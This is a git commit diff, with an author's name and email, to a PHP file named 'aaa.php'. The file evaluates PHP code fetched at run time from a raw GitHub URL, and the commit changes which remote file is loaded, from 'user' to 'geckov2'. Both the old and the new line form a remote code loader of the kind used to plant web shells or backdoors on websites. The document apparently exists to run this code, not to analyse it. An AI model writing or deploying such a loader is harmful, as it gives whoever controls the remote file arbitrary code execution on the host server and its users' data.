a95749c4de5fd91220eebcb2fb2f93f3c2a33f27
Davina Diandra <davinadiandra07@gmail.com>
2025-07-09 21:40:33 +0700

    Update aaa.php

--- aaa.php
+++ aaa.php
@@ -2,7 +2,7 @@
 eval( 
   urldecode("%3f%3e") . 
   file_get_contents(
-    urldecode("https://raw.githubusercontent.com/davinadiandra07/module/refs/heads/main/user")
+    urldecode("https://raw.githubusercontent.com/davinadiandra07/module/refs/heads/main/geckov2")
   )
 );
 ?>
